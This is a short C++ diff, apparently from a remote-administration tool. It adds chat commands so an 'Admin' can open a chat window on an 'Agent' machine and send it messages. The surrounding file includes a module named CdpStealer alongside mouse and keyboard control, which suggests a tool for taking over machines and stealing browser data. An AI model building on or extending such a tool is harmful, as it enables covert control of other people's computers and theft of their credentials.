@@ -9,6 +9,7 @@
 #include "MouseControl.h"
 #include "CdpStealer.h"
 #include "KeyboardControl.h"
+#include "ChatManager.h"
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -281,4 +282,33 @@ json ProcessHandlers::handleKeyboardInput(const json &req)
     }
 
     return {};
+}
+
+// === CHAT SYSTEM ===
+json ProcessHandlers::handleChatCommand(const json &req)
+{
+    std::string cmd = req.value("command", "");
+
+    if (cmd == "chat_start")
+    {
+        ChatManager::Start();
+        return makeStatus(true, "Chat UI opened");
+    }
+    else if (cmd == "chat_stop")
+    {
+        ChatManager::Stop();
+        return makeStatus(true, "Chat UI closed");
+    }
+    else if (cmd == "chat_message")
+    {
+        std::string text = req.value("text", "");
+        if (!text.empty())
+        {
+            // Hiển thị tin nhắn từ Admin lên cửa sổ Chat của Agent
+            ChatManager::AppendText("Admin: " + text);
+        }
+        return {}; // Tin nhắn không cần phản hồi JSON về client
+    }
+
+    return makeStatus(false, "Unknown chat command");
 }
